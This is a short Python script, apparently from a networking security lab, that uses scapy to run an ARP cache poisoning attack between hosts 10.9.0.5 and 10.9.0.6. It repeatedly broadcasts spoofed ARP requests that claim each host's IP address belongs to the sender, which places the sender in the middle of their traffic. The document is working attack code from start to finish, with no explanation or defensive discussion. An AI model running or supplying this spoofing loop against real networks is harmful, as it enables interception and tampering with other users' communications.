#!/usr/bin/env python3
from scapy.all import *
import time

E = Ether()

A = ARP()
A.psrc = '10.9.0.6'
A.pdst = '10.9.0.5'
A.hwdst = 'ff:ff:ff:ff:ff:ff'
A.op = 1

B = ARP()
B.psrc = '10.9.0.5'
B.pdst = '10.9.0.6'
B.hwdst = 'ff:ff:ff:ff:ff:ff'
B.op = 1

while(1):
    sendp(E/A)
    sendp(E/B)
    time.sleep(5)
